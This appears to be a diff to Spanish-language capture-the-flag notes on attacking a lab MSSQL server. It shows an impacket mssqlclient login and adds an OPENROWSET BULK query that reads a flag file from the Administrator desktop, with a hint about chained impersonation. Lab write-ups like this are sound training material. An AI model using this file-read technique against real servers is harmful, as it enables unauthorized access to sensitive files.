@@ -116,7 +116,10 @@ MSSQL&#x20;
 mssqlclient.py -p 1433 WIN-HARD/fiona@10.129.91.176 -windows-auth
 ```
 
+#### Leer archivo
 
+```
+SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\flag.txt', SINGLE_CLOB) AS Contents;
+```
 
-
-
+Clue: double impersonation, and a simple file read.
